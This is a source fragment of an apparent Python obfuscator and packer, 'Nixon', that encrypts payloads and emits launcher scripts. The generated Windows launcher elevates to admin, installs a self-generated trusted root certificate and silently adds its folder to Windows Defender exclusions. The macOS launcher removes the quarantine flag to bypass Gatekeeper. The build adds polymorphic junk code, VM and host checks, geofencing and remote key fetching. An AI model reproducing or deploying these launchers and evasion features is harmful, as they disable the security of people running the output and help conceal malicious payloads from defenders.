    if filename.endswith(".py"):
        launch_cmd = f'python "{filename}" %*'
    else:
        launch_cmd = f'"{filename}" %*'
    bat_content = f"""@echo off
set "CERT_NAME=Nixon Security Systems"
set "CERT_FILE=%~dp0{cert_name}"
NET SESSION >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Requesting Admin privileges for First-Time Setup...
    powershell -Command "Start-Process '%~dpnx0' -Verb RunAs"
    exit /b
)
echo [*] Checking Security Certificate Trust...
certutil -user -verifystore Root "%CERT_NAME%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [+] Certificate already trusted. Skipping install.
) else (
    echo [!] Certificate not found. Installing Trusted Root...
    if exist "%CERT_FILE%" (
        certutil -user -addstore Root "%CERT_FILE%"
        echo [+] Certificate Installed Successfully.
    ) else (
        echo [!] Certificate file missing. Attempting auto-generation...
        powershell -Command "New-SelfSignedCertificate -Type Custom -Subject 'CN=%CERT_NAME%, O=Nixon Labs' -KeyUsage DigitalSignature -FriendlyName 'Nixon Trusted Root' -CertStoreLocation 'Cert:\\CurrentUser\\My' -TextExtension @('2.5.29.37={{text}}1.3.6.1.5.5.7.3.3', '2.5.29.19={{text}}')" >nul 2>&1
        echo [!] Windows Auto-Gen complete.
    )
)
echo [*] Whitelisting application folder...
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1
echo [+] Launching...
cd /d "%~dp0"
{launch_cmd}
"""
    with open(bat_path, "w") as f:
        f.write(bat_content)
    print(f" [+] Generated Windows Smart-Launcher: {bat_path}")
    mac_path = os.path.join(base_dir, mac_name)
    if filename.endswith(".py"):
        mac_launch = f'python3 "$(dirname "$0")/{filename}"'
    else:
        mac_launch = f'"$(dirname "$0")/{filename}"'
    sh_content = f"""#!/bin/bash
clear
echo "[*] Nixon Security Wrapper"
DIR="$(cd "$(dirname "$0")" && pwd)"
echo "[*] Bypassing Gatekeeper..."
xattr -d com.apple.quarantine "$DIR/{filename}" 2>/dev/null
echo "[+] Starting..."
{mac_launch}
"""
    with open(mac_path, "w") as f:
        f.write(sh_content)
    os.chmod(mac_path, 0o755) 
    print(f" [+] Generated macOS Smart-Launcher: {mac_path}")
    return [bat_path, mac_path]
def polymorph_cpp_stub():
    target = "nixon_stub.cpp"
    if not os.path.exists(target): return
    try:
        with open(target, "r", encoding="utf-8") as f: lines = f.readlines()
        mutated = []
        for line in lines:
            mutated.append(line)
            sline = line.strip()
            if sline.endswith("{") and "struct " not in sline and "class " not in sline and "switch " not in sline:
                if random.random() < 0.15:
                    r1 = random.randint(1000, 9999)
                    r2 = random.randint(10, 99)
                    ret_val = " 0" if "int " in sline or "DWORD " in sline else ""
                    mutated.append(f"    volatile int _jnk_{r1} = {r2};\n    if (_jnk_{r1} == 0xDEADBEEF) {{ return{ret_val}; }}\n")
        with open(target, "w", encoding="utf-8") as f: f.writelines(mutated)
        UI.item("Polymorphism", f"{target} mutated", "INJECTED")
    except Exception as e:
        UI.warn(f"Failed to polymorph C++ stub: {e}")

def load_tls_ca_bundle(path):
    """Return the embedded CA-bundle literal for the emitted TLS context.

    The emitted loader verifies the certificate chain and the hostname
    against the system trust store; this bundle ADDS an operator-owned CA
    on top (it never disables verification).  The PEM is embedded base64
    encoded so the artifact stays self-contained and portable.

    Returns a Python string literal (``"''"`` when there is no bundle).
    Raises on an unreadable or empty bundle — the caller must fail the
    build rather than silently ship an artifact that cannot reach its
    endpoint.
    """
    path = str(path or "").strip()
    if not path:
        return "''"
    try:
        with open(path, "rb") as fh:
            pem = fh.read()
    except OSError as exc:
        raise ValueError("cannot read CA bundle %r: %s" % (path, exc))
    if not pem.strip():
        raise ValueError("CA bundle %r is empty" % (path,))
    return repr(base64.b64encode(pem).decode("ascii"))

_KEY_BINDING_TEMPLATE = r"""
def _nx_bind_blob_key(_raw):
    try:
        import hashlib as _h, json as _j, os as _o, sys as _s
        if "__MODE__" == "licence":
            _mat = None
            _cands = []
            _named = _o.environ.get("NIXON_LICENCE")
            if _named:
                _cands.append(_named)
            _base = _o.path.dirname(_o.path.abspath((_s.argv[0] if _s.argv else "") or ""))
            for _d in (_base, _o.getcwd()):
                for _n in ("licence.json", "licence.licence", "license.json"):
                    _cands.append(_o.path.join(_d, _n))
            for _c in _cands:
                try:
                    with open(_c, "r", encoding="utf-8") as _f:
                        _mat = ((_j.load(_f) or {}).get("payload") or {}).get("key_material")
                    if _mat:
                        break
                except Exception:
                    continue
            if not _mat:
                _s.stderr.write("licence token required: set NIXON_LICENCE or place licence.json beside the artefact\n")
                raise SystemExit(1)
        else:
            _mat = "__SALT__"
        _m = _h.sha256(b"nx-customer:" + _mat.encode()).digest()
        return bytes([_b ^ _m[_i % len(_m)] for _i, _b in enumerate(_raw)])
    except SystemExit:
        raise
    except Exception:
        raise SystemExit(1)


BLOB_KEY = _nx_bind_blob_key(BLOB_KEY)"""


def _key_binding_source(mode: str, customer_salt: str) -> str:
    """The run-time binding emit for a key-bound artefact.

    ``mode='salt'`` ships the salt (so this separates builds), ``'licence'``
    ships nothing and reads the token's key_material at run time (so the
    artefact alone cannot decrypt).
    """
    if '"' in customer_salt or "\\" in customer_salt or "\n" in customer_salt:
        raise SystemExit("customer_salt contains characters the loader cannot carry")
    return (_KEY_BINDING_TEMPLATE
            .replace("__MODE__", str(mode))
            .replace("__SALT__", str(customer_salt)))


def build_project(args):
    source = args.source
    # One stream for every random draw this build makes (keys, nonces,
    # salts, timestamps).  Without --randomization-seed it is OS entropy,
    # exactly as before; with it the build is reproducible.
    _ent = _BuildEntropy(getattr(args, "randomization_seed", None))
    _reseed_string_table_keys(_ent)
    # These are minted at import time in obfuscator/core/sources.py, so
    # their values are fixed for the life of the process: two builds in
    # one process share them, two processes never do.  Re-drawing them per
    # build is what lets a pinned seed reproduce an artefact at all.
    VARS["MARKER_TOKEN"] = _ent.hex(5)
    VARS["PART_PREFIX"] = "_" + _ent.hex(6)
    VARS["STR_KEY"] = _ent.below(255) + 1
    for _cls in ("FHE_CLS", "ORAM_CLS", "SYNTH_CLS", "FAULT_CLS"):
        VARS[_cls] = "_nixon_" + _ent.hex(4)
    # The name/slot helpers draw from the module-level `random`, which is
    # otherwise unseeded -- one of the reasons two "identical" builds never
    # matched.
    if _ent.pinned:
        random.seed(_ent.bytes(16))
    # Licence binding (--licence-token): the payload key is derived from the
    # token's secret key material instead of a shipped literal salt, so the
    # artefact alone cannot decrypt.  Resolved first: the hybrid-loader call
    # below happens before the rest of the build context exists.
    _licence_bound = False
    _key_raw = None
    _customer_salt = str(getattr(args, "customer_salt", "") or "")
    _licence_path = str(getattr(args, "licence_token", "") or "")
    if _licence_path:
        import json as _lic_json
        with open(_licence_path, "r", encoding="utf-8") as _lic_fh:
            _lic_doc = _lic_json.load(_lic_fh)
        _lic_km = ((_lic_doc or {}).get("payload") or {}).get("key_material")
        if not _lic_km:
            raise SystemExit(
                "licence token %s carries no key_material; reissue it with "
                "this version of obfuscator.licensing" % _licence_path)
        _customer_salt = str(_lic_km)
        _licence_bound = True
    # Both key bindings are applied on this path too (see the blob-key
    # emission below), so the flags no longer require --native.
    if not os.path.exists(source): 
        UI.fatal(f"Source file not found: {source}")
        return
    if getattr(args, 'native', False) or getattr(args, 'native_only', False):
        UI.section("PHASE 2: COMPILATION & OBFUSCATION")
        polymorph_cpp_stub()
        local_py_ver = f"{sys.version_info.major}.{sys.version_info.minor}"
        if not getattr(args, 'python', None) or args.python != local_py_ver:
             print(f" [!] Syncing Cloud Python version to local system: {local_py_ver}")
             args.python = local_py_ver
        with UI.Task("Native Build", "Building Native Binary...") as t:
            target_py = sys.executable
            blob_data, blob_name = build_local_cython(open(source, 'r').read(), target_python=target_py)
            blob_key = _ent.bytes(32)
            args._inner_key = blob_key
            blob_key_hex = blob_key.hex()
            blobs = {'windows': '', 'linux': '', 'darwin': '', 'android': ''}
            current_os = platform.system().lower()
            if blob_data:
                end_blob = fast_xor_bytes(blob_data, blob_key)
                b64_blob = base64.b64encode(end_blob).decode('ascii')
                if "linux" in current_os: blobs["linux"] = b64_blob
                elif "windows" in current_os: blobs["windows"] = b64_blob
                elif "darwin" in current_os: blobs["darwin"] = b64_blob
                t.success(f"{blob_name} (Base64)")
            else:
                t.update(status="WARN", value="Skipped/Failed (Using bytecode)")
                UI._console.write("\n") 
        with UI.Task("Hybrid Loader", "Compiling Universal Fallback...") as t:
            # NOTE: 'ast_options' is assigned later in this function, so it
            # is never in locals() here — the literal below is the live
            # branch (the .copy() alternative was dead).
            fallback_opts = {
                'cfg_flatten': True, 'opaque_predicates': True, 'fragment_strings': True, 'exception_flow': True,
                'mba_subs': True, 'obf_calls': True, 'stego': getattr(args, 'stego', False),
                'vm_nest': 1, 'bogus_exceptions': True, 'split_vars': True,
                'unfold_constants': True, 'strip_meta': True, 'unicode_ids': True,
                'dynamic_code': True, 'enhanced_junk': True, 'func_transform': True,
                'reflection': True, 'blockchain_rpc': getattr(args, 'rpc', ''),
                'runtime_check_code': getattr(args, 'runtime_check_code', 'pass'),
                'blockchain_contract': getattr(args, 'contract', ''),
                'key_shard_urls': getattr(args, 'shards', '').split(',') if getattr(args, 'shards', '') else [],
                'allowed_countries': getattr(args, 'allow_countries', '').split(',') if getattr(args, 'allow_countries', '') else [],
                'blocked_countries': getattr(args, 'block_countries', '').split(',') if getattr(args, 'block_countries', '') else [],
                'allowed_regions': getattr(args, 'allow_regions', '').split(',') if getattr(args, 'allow_regions', '') else [],
                'blocked_regions': getattr(args, 'block_regions', '').split(',') if getattr(args, 'block_regions', '') else []
            }
            fallback_opts['force_native'] = "False"
            # Phase-4 wiring: thread hwid/trial/macros into the fallback compile.
            _w_hwid = str(getattr(args, 'hwid', '') or '')
            _w_trial_seconds = None
            _w_trial_spec = str(getattr(args, 'trial', '') or '')
            if _w_trial_spec:
                try:
                    from obfuscator.macros import parse_trial as _parse_trial
                    _w_trial_seconds = _parse_trial(_w_trial_spec)
                except Exception as _trial_err:
                    try: UI.warn(f"Bad --trial spec {(_w_trial_spec)!r}: {_trial_err} (ignored)")
                    except Exception: print(f" [!] Bad --trial spec {(_w_trial_spec)!r}: {_trial_err} (ignored)")
                    _w_trial_seconds = None
            _w_vm_threshold = getattr(args, 'vm_threshold', 50.0)
            try: _w_vm_threshold = float(_w_vm_threshold)
            except Exception: _w_vm_threshold = 50.0
            _w_kod = bool(getattr(args, 'kod', False))
            _w_hostguard = bool(getattr(args, 'hostguard', False))
            _w_hwid_lock = bool(getattr(args, 'hwid_lock', False))
            _w_driver_check = bool(getattr(args, 'driver_check', False))
            _w_split_bootstrap = bool(getattr(args, 'split_bootstrap', False))
            _w_snapshot_off = bool(getattr(args, 'snapshot_off', False))
            _w_stdlib_audit_off = bool(getattr(args, 'stdlib_audit_off', False))
            fallback_opts['hwid'] = _w_hwid
            fallback_opts['trial_seconds'] = _w_trial_seconds
            fallback_opts['vm_threshold'] = _w_vm_threshold
            fallback_opts['kod'] = _w_kod
            fallback_opts['hostguard'] = _w_hostguard
            fallback_opts['hwid_lock'] = _w_hwid_lock
            fallback_opts['driver_check'] = _w_driver_check
            fallback_opts['split_bootstrap'] = _w_split_bootstrap
            fallback_opts['snapshot_off'] = _w_snapshot_off
            fallback_opts['stdlib_audit_off'] = _w_stdlib_audit_off
            _bc_ok = False
            for _bc_try in range(3):
                try:
                    _fallback_raw = open(source, 'r').read()
                    try:
                        from obfuscator.macros import collect_macros as _cm, apply_macros as _am
                        if _cm(_fallback_raw):
                            _fallback_raw = _am(_fallback_raw, hwid=_w_hwid)
                    except Exception:
                        pass
                    protected_source_fallback, _ = apply_ast_mutation(_fallback_raw, fallback_opts)
                    bytecode_obj = compile(protected_source_fallback, "<hybrid>", "exec")
                    bytecode_data = marshal.dumps(bytecode_obj)
                    if _w_hwid_lock and _w_hwid:
                        try:
                            from obfuscator.hwid_lock import lock_payload as _lock_payload
                            import json as _json_hl
                            _lock_pack = _lock_payload(bytecode_data, _w_hwid)
                            bytecode_data = _json_hl.dumps(_lock_pack, sort_keys=True).encode('utf-8')
                        except Exception as _hl_err:
                            try: UI.warn(f"HWID-lock failed: {_hl_err} (continuing unlocked)")
                            except Exception: print(f" [!] HWID-lock failed: {_hl_err} (continuing unlocked)")
                    # Batch-2 compress contest (additive): best-of-N backends at
                    # the FALLBACK_BLOB choke point. Envelope = backend-ID byte
                    # + compressed bytes; loader handles the prefix, legacy
                    # prefix-less zlib blobs still decode. Falls back to plain
                    # zlib on any contest error (behavior-preserving).
                    try:
                        from obfuscator.compress_contest import (
                            best_compress as _cc_best,
                            pack as _cc_pack,
                        )
                        _cc_name, _cc_blob = _cc_best(bytecode_data)
                        real_fallback_enc = fast_xor_bytes(_cc_pack(_cc_name, _cc_blob), blob_key)
                    except Exception:
                        real_fallback_enc = fast_xor_bytes(zlib.compress(bytecode_data), blob_key)
                    _bc_ok = True
                    break
                except Exception as e:
                    if _bc_try < 2:
                        t.update(value=f"Retry {_bc_try+1}/3 (seed reset)...")
                        random.seed(_ent.bytes(32))
                    else:
                        traceback.print_exc()
                        t.fail(f"Bytecode Compilation Failed: {e}")
                        return
            if not _bc_ok: return
            t.update(value="Generating Template...")
            t.update(value="Generating Template...")
            is_native_only = getattr(args, 'native_only', False)
            if is_native_only:
                UI.warn("Maximum Security: Fallback Mechanism DISABLED")
            hybrid_loader_src, real_blobs_dict, real_fallback_str = generate_hybrid_loader_script(
                blobs, real_fallback_enc, blob_key_hex, native_only=is_native_only,
                hwid=_w_hwid, trial_seconds=_w_trial_seconds,
                vm_threshold=_w_vm_threshold, kod=_w_kod, hostguard=_w_hostguard,
                hwid_lock=(_w_hwid_lock and bool(_w_hwid)),
                driver_check=_w_driver_check,
                split_bootstrap=_w_split_bootstrap,
                snapshot_off=_w_snapshot_off,
                stdlib_audit_off=_w_stdlib_audit_off,
                section_split=bool(getattr(args, 'section_split', False)),
                section_count=int(getattr(args, 'section_count', 4) or 4),
                watermark=str(getattr(args, 'watermark', '') or '') or None,
                customer_salt=_customer_salt,
                licence_bound=_licence_bound,
            )
            if getattr(args, 'section_split', False):
                # The split needs a fallback payload to split, and there
                # is no fallback at all in --native-only mode.  Say so
                # instead of silently shipping the single blob.
                if "_NX_SECTION_PACK = ''" in hybrid_loader_src:
                    UI.warn("Section split was requested but could not be "
                            "armed (no fallback payload, or --native-only); "
                            "the single blob is used instead.")
            args._real_native_blobs = real_blobs_dict
            args._real_fallback_blob = real_fallback_str
            # Secure temp (no predictable CWD artifact): system temp dir,
            # random name, 0600; removed at the end of build_project.
            fd, loader_path = tempfile.mkstemp(suffix=".py", prefix="hybrid_loader_")
            os.close(fd)
            try:
                os.chmod(loader_path, 0o600)
            except Exception:
                pass
            args._tmp_hybrid_loader = loader_path
            with open(loader_path, 'w', encoding='utf-8') as f:
                f.write(hybrid_loader_src)
            t.success(value="Universal Fallback Generated")
        UI.item("Hybrid Context", loader_path, "READY")
        args.source = loader_path
        source = loader_path 
    start_time = time.time()
    base_out_name = f"{os.path.basename(source).split('.')[0]}_Nixon-Enc.py"
    # Intermediates (the packed variants, the report) belong next to the
    # source, not in whatever directory the CLI happened to be run from.
    out_dir = os.path.dirname(os.path.abspath(source))
    base_out_path = os.path.join(out_dir, base_out_name)
    if not getattr(args, 'native', False): 
         UI.section("PHASE 2: COMPILATION & OBFUSCATION")
    hw_enable = bool(args.bind_mac)
    one_shot = bool(args.one_shot)
    _lock_hwid = str(getattr(args, 'lock_hwid', '') or '')
    watermark_seed = _lock_hwid.encode() if _lock_hwid else None
    deployed_rpc = ""
    deployed_contract = ""
    bytecode_hex = None
    runtime_key = _ent.hex(16)
    project_hash = hashlib.md5(os.path.abspath(source).encode()).hexdigest()[:8]
    canary_url_enc = str(register_string(args.webhook)) if args.webhook else ""
    exp_ts = 0
    if args.expire:
        try: exp_ts = datetime.strptime(args.expire, "%Y-%m-%d").timestamp()
        except Exception: UI.fatal(f"Bad --expire date {args.expire!r}: expected YYYY-MM-DD")
    if getattr(args, 'auto_deploy', False):
        deploy_rpc = getattr(args, 'deploy_rpc', 'http://localhost:8545')
        explorer_url = getattr(args, 'explorer', None)
        private_key = getattr(args, 'private_key', None)
        addr, rpc = auto_deploy_contract(deploy_rpc, explorer_url, private_key)
        if addr:
            deployed_contract = addr
            deployed_rpc = rpc
            UI.item("Blockchain", "Contract Auto-Deployed", "EMBEDDED")
        else:
            UI.warn("Auto-deploy failed, using manual defaults")
    if getattr(args, 'cf_token', None) and getattr(args, 'cf_account', None):
        deployer = CloudflareDeployer(args.cf_token, args.cf_account)
        key_file = f".nixon_key_{project_hash}"
        try:
            with open(key_file, "r") as f:
                args._cf_hmac_key = f.read().strip()
            UI.dot_item("Master Key", "Loaded existing HMAC Key", "OK")
        except FileNotFoundError:
            args._cf_hmac_key = _ent.hex(32)
            with open(key_file, "w") as f:
                f.write(args._cf_hmac_key)
            try:
                os.chmod(key_file, 0o600)
            except Exception:
                pass
            UI.dot_item("Master Key", "Generated new HMAC Key", "SAVED")
        deployed_url = deployer.deploy_master(hmac_key=args._cf_hmac_key)
        if deployed_url:
            deployed_rpc = deployed_url
            CRITICAL_PAYLOAD = f"""
global _RUNTIME_KEY, _VERIFY_INTEGRITY, _RUNTIME_DIGEST
_RUNTIME_KEY = bytes.fromhex('{runtime_key}')
import hashlib as _nx_hashlib
_RUNTIME_DIGEST = _nx_hashlib.sha256(_RUNTIME_KEY).hexdigest()
# Legacy network-payload path: real check (never unconditional True).
def _VERIFY_INTEGRITY():
    try:
        return bool(_nx_hashlib.sha256(_RUNTIME_KEY).hexdigest() == _RUNTIME_DIGEST)
    except Exception:
        return False
"""
            code_obj = compile(CRITICAL_PAYLOAD, '<network>', 'exec')
            bytecode_hex = "0x" + marshal.dumps(code_obj).hex()
            if _lock_hwid:
                hw_hash = hashlib.sha256(_lock_hwid.encode()).hexdigest()
                UI.item("Verification", f"Target HWID: {hw_hash[:16]}...", "INFO")
                deployer.add_license(hw_hash, bytecode_hex, f"Build-{base_out_name}")
            args.runtime_key = runtime_key
            args._bytecode_hex = bytecode_hex
    if bytecode_hex is None and runtime_key:
         CRITICAL_PAYLOAD = f"""
global _RUNTIME_KEY, _VERIFY_INTEGRITY, _RUNTIME_DIGEST
_RUNTIME_KEY = bytes.fromhex('{runtime_key}')
import hashlib as _nx_hashlib
_RUNTIME_DIGEST = _nx_hashlib.sha256(_RUNTIME_KEY).hexdigest()
# Legacy offline-payload path: real check (never unconditional True).
def _VERIFY_INTEGRITY():
    try:
        return bool(_nx_hashlib.sha256(_RUNTIME_KEY).hexdigest() == _RUNTIME_DIGEST)
    except Exception:
        return False
"""
         code_obj = compile(CRITICAL_PAYLOAD, '<network>', 'exec')
         bytecode_hex = "0x" + marshal.dumps(code_obj).hex()
         args._bytecode_hex = bytecode_hex
    if not args.net_url:
        args.net_url = deployed_rpc
    net_url_Nixon_Enc = str(register_string(args.net_url)) if args.net_url else ""
    # TLS trust bundle for the emitted key fetch.  The emitted loader
    # verifies the certificate chain and the hostname against the system
    # trust store; --tls-ca-bundle ADDS an operator-owned CA on top (it
    # never disables verification).  The PEM is embedded so the artifact
    # stays self-contained and portable.
    try:
        tls_ca_b64 = load_tls_ca_bundle(getattr(args, "tls_ca_bundle", None))
    except ValueError as _ca_exc:
        UI.fatal("Cannot use --tls-ca-bundle: %s" % (_ca_exc,))
        return
    native_blobs = find_native_blobs(args.source)
    if not native_blobs: native_blobs = {'windows': '', 'linux': '', 'darwin': ''}
    # Phase-4 wiring: parse trial once (invalid -> warn + None), defaults match build.py.
    _bp_trial_seconds = None
    _bp_trial_spec = str(getattr(args, 'trial', '') or '')
    if _bp_trial_spec:
        try:
            from obfuscator.macros import parse_trial as _bp_parse_trial
            _bp_trial_seconds = _bp_parse_trial(_bp_trial_spec)
        except Exception as _bp_trial_err:
            try: UI.warn(f"Bad --trial spec {(_bp_trial_spec)!r}: {_bp_trial_err} (ignored)")
            except Exception: print(f" [!] Bad --trial spec {(_bp_trial_spec)!r}: {_bp_trial_err} (ignored)")
            _bp_trial_seconds = None
    try:
        _bp_vm_threshold = float(getattr(args, 'vm_threshold', 50.0))
    except Exception:
        _bp_vm_threshold = 50.0
    ast_options = {
        'cfg_flatten': True,
        'opaque_predicates': True,
        'exception_flow': True,
        'fragment_strings': True,
        'mba_subs': True,
        'obf_calls': True,
        'stego': getattr(args, 'stego', False),
        'vm_nest': 1,
        'bogus_exceptions': True,
        'split_vars': True,
        'unfold_constants': True,
        'strip_meta': True,
        'unicode_ids': True,
        'code_checksums': True,
        'dynamic_code': True,
        'enhanced_junk': True,
        'func_transform': not getattr(args, 'native', False),
        'reflection': not getattr(args, 'native', False),
        'hwid': str(getattr(args, 'hwid', '') or ''),
        'trial_seconds': _bp_trial_seconds,
        'vm_threshold': _bp_vm_threshold,
        'kod': bool(getattr(args, 'kod', False)),
        'hostguard': bool(getattr(args, 'hostguard', False)),
        'driver_check': bool(getattr(args, 'driver_check', False)),
        'split_bootstrap': bool(getattr(args, 'split_bootstrap', False)),
        'hwid_lock': bool(getattr(args, 'hwid_lock', False)),
        'name_gate': bool(getattr(args, 'name_gate', False)),
        'rename_internal': bool(getattr(args, 'rename_internal', False)),
        'lowering': str(getattr(args, 'lowering', '') or ''),
        'blockchain_contract': deployed_contract or getattr(args, 'contract', '') or '',
        'blockchain_rpc': deployed_rpc or getattr(args, 'rpc', '') or '',
        'key_shard_urls': [s.strip() for s in getattr(args, 'shards', '').split(',') if s.strip()] if getattr(args, 'shards', None) else [],
        'allowed_countries': [c.strip() for c in getattr(args, 'allow_countries', '').split(',') if c.strip()] if getattr(args, 'allow_countries', None) else [],
        'blocked_countries': [c.strip() for c in getattr(args, 'block_countries', '').split(',') if c.strip()] if getattr(args, 'block_countries', None) else [],
        'allowed_regions': [r.strip() for r in getattr(args, 'allow_regions', '').split(',') if r.strip()] if getattr(args, 'allow_regions', None) else [],
        'blocked_regions': [r.strip() for r in getattr(args, 'block_regions', '').split(',') if r.strip()] if getattr(args, 'block_regions', None) else [],
        'runtime_check_code': f"if '_RUNTIME_KEY' not in globals() or _RUNTIME_KEY != bytes.fromhex('{runtime_key}'): import sys; sys.exit(0)",
        'force_native': repr(VARS.get("FORCE_NATIVE_EXEC", False))
    }
    # The protection ladder applies to the loader build too, so both
    # CLIs resolve a level the same way.  Without --opt-level the
    # transform set above is unchanged (the loader build has always
    # applied the full set); with it, the flags the ladder controls
    # follow the level.  The flags the ladder does NOT control (the
    # loader's own structural requirements) are untouched.
    _loader_level = getattr(args, 'opt_level', None)
    if _loader_level is not None:
        from obfuscator.opt_levels import resolve as _resolve_level
        _resolved = _resolve_level(_loader_level)
        for _canon, _ast_key in OPT_LEVEL_TO_AST.items():
            if _canon in _resolved and _ast_key in ast_options:
                ast_options[_ast_key] = bool(_resolved[_canon])
        UI.dot_item("Opt level", f"level {_loader_level}", "ACTIVE")
    enabled = [k for k, v in ast_options.items() if v]
    if enabled:
        UI.dot_item("Protection", f"Applied {len(enabled)} mutations", "ACTIVE")
    generated_outputs = []
    generated_files_map = {}
    var_oneshot = get_random_var_name("ONESHOT")
    get_random_var_name('MEMFD')
    var_canary_url = get_random_var_name("WEBHOOK")
    var_func_canary = get_random_var_name("TRIG")
    i_salt = _ent.bytes(32)
    morph_seed = _ent.randint(0, 1000000)
    morpher = OpcodeMorpher(morph_seed)
    runtime_morph_map = morpher.get_runtime_map()
    enc_map = morpher.enc_map
    keys = list(runtime_morph_map.keys())
    half = len(keys) // 2
    map_a = {k: runtime_morph_map[k] for k in keys[:half]}
    map_b = {k: runtime_morph_map[k] for k in keys[half:]}
    if args.native or getattr(args, 'native_only', False):
        if hasattr(args, '_real_native_blobs') and args._real_native_blobs:
            native_blobs = args._real_native_blobs
            UI.dot_item("Native Blobs", "Verified from build step", "OK")
        else:
            fat_blobs = get_native_blob_for_build(source, force_compile=True) if (args.native or getattr(args, 'native_only', False)) else None
            native_blobs = fat_blobs if fat_blobs else {'windows': '', 'linux': '', 'darwin': ''}
        native_blob = any(native_blobs.values())
        if native_blob:
            UI.dot_item("Compilation", "Native compilation successful", "OK")
            VARS["FORCE_NATIVE_EXEC"] = True
        else:
            UI.fail("Native compilation failed, using Python mode")
            native_blob = ""
            VARS["FORCE_NATIVE_EXEC"] = False
    else:
        native_blob = ""
        native_blobs = {'windows': '', 'linux': '', 'darwin': ''}
        VARS["FORCE_NATIVE_EXEC"] = False
    UI._out(f" {UI.BLUE}├──{UI.RESET} {UI.BOLD}Output Generation{UI.RESET} :")
    variants = [("Debug", True), ("Silent", False)]
    for i, (suffix, is_debug) in enumerate(variants):
        prefix = "│   └─" if i == len(variants) - 1 else "│   ├─"
        out_name = os.path.splitext(base_out_path)[0] + f"_{suffix}.py"
        t = UI.Task(f"[ {suffix.upper()} ]", f"Generating {suffix} Version...", prefix=prefix)
        t.__enter__()
        generated_files_map[suffix] = out_name
        build_dir = tempfile.mkdtemp()
        swizzle_key = _ent.bytes(16)
        secure_map_str = "{}"
        try:
            if os.path.isdir(source):
                tasks = []
                for root, dirs, files in os.walk(source):
                    for file in files: tasks.append((os.path.join(root, file), build_dir, list(swizzle_key), out_name, source, enc_map, ast_options))
                for task in tasks: process_file_safe(task)
            else:
                dest = os.path.join(build_dir, "__main__.py")
                with open(source, "rb") as f: raw_source = f.read()
                try:
                    decoded_source = raw_source.decode('utf-8')
                    # Phase-4 wiring: build-time macro expansion on the source
                    # read before obfuscation (no-op when no macros present).
                    try:
                        from obfuscator.macros import collect_macros as _cm2, apply_macros as _am2
                        _bp2_hwid = str(ast_options.get('hwid', '') or '')
                        if _cm2(decoded_source):
                            decoded_source = _am2(decoded_source, hwid=_bp2_hwid)
                    except Exception:
                        pass
                    if 'NIXON_PROTECTED' in decoded_source or '_load_native' in decoded_source:
                        print("    [*] Hybrid loader detected - applying protection...")                        
                        decoded_source = decoded_source.replace(
                            'def _load_native():',
                            'def _load_native():\n    """NIXON_PROTECTED"""'
                        )
                        decoded_source = decoded_source.replace(
                            'def _exec_fallback():',
                            'def _exec_fallback():\n    """NIXON_PROTECTED"""'
                        )
                        xor_dec_source = '''def _xor_decrypt(data, key):
    """NIXON_PROTECTED"""
    k_len = len(key)
    return bytes([b ^ key[i % k_len] for i, b in enumerate(data)])
'''
                        decoded_source = re.sub(r'def _xor_decrypt\(.*?\):[\s\S]*?return.*?(?=\n\S)', xor_dec_source.strip(), decoded_source, count=1)
                    cur_opts = ast_options.copy()
                    cur_opts['symbol_rename'] = True
                    cur_opts['strip_meta'] = False
                    cur_opts['log_file'] = out_name
                    mutated_source, secure_map = apply_ast_mutation(decoded_source, cur_opts)
                    if hasattr(args, '_real_native_blobs') and hasattr(args, '_real_fallback_blob'):
                         print("    [+] Injecting Real Encrypted Blobs into Obfuscated Source...")
                         mutated_source = mutated_source.replace("'_NX_PART_NATIVE_DICT_PLACEHOLDER'", repr(args._real_native_blobs))
                         mutated_source = mutated_source.replace("_NX_PART_FALLBACK_BLOB_PLACEHOLDER", args._real_fallback_blob)
                    secure_map_str = repr(secure_map)
                    raw_source = mutated_source.encode('utf-8')
                except Exception: pass
                header = b"# NIXON_HEADER \n" 
                swizzled_body = swizzle_bytecode(raw_source, bytes(swizzle_key))
                with open(dest, "wb") as f: f.write(header + swizzled_body)
            buf = io.BytesIO()
            inner_key = _ent.bytes(32)
            inner_key_hex = inner_key.hex()
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
                for root, dirs, files in os.walk(build_dir):
                    for file in files:
                        full_path = os.path.join(root, file)
                        rel_path = os.path.relpath(full_path, build_dir)
                        if file == "__main__.py" or file == os.path.basename(source):
                            try:
                                with open(full_path, 'r') as f: src_content = f.read()
                                code_obj = compile(src_content, rel_path, 'exec')
                                marshalled = marshal.dumps(code_obj)
                                enc_marshalled = bytearray(marshalled)
                                for i in range(len(enc_marshalled)): enc_marshalled[i] ^= inner_key[i % 32]
                                z.writestr("__main__.nixon", enc_marshalled)
                            except Exception: z.write(full_path, rel_path)
                        else: z.write(full_path, rel_path)
            zip_bytes = buf.getvalue()
            # Authenticate the payload.  The zip is XOR-encrypted and has
            # no MAC of its own, so a byte flipped in the payload region
            # used to corrupt the payload SILENTLY: the loader ran, the
            # payload was garbage, and nothing said so.  The tag is keyed
            # with the inner key (already embedded) and checked by the
            # loader before it extracts anything.
            payload_mac = hmac.new(inner_key, zip_bytes,
                                   hashlib.sha256).hexdigest()
            raw = VARS["MAGIC"] + zip_bytes
            entropy_marker = _ent.bytes(16)
            padded_raw = inject_entropy_tlv(raw, entropy_marker)
            key = getattr(args, '_inner_key', None) or _ent.bytes(32); nonce = _ent.bytes(16)
            # The artefact carries the RAW key; the loader re-applies this
            # mask at run time from the customer salt or the licence token's
            # key_material.  Encryption below uses the masked key, so an
            # artefact without its token decrypts to garbage.
            _key_raw = key
            if _customer_salt or _licence_bound:
                _bm = hashlib.sha256(b"nx-customer:" + _customer_salt.encode()).digest()
                key = bytes([_b ^ _bm[_i % len(_bm)] for _i, _b in enumerate(key)])
            recipe_in = generate_recipe(6); recipe_out = generate_recipe(6, True)
            # Emitted into the artefact (BUILD_TIMESTAMP), so a
            # reproducible build needs it pinned too.  A pinned build
            # gets a stable, clearly-synthetic date.
            build_timestamp = (1700000000 + _ent.below(86400)) if _ent.pinned else int(time.time())
            time_salt = hashlib.sha256(str(0).encode()).digest()
            sim_h = 0
            for i in range(7): sim_h = next_h(sim_h, i)
            prov_salt = hashlib.sha256(str(sim_h).encode()).digest()
            encryption_key = bytes([a ^ b ^ c for a, b, c in zip(key, time_salt, prov_salt)])
            # Loader-compatibility: the artifact-side decryptors (CIPHER_SOURCE
            # XOR-stream, hybrid _xor_decrypt) have no AES-CTR inverse, and the
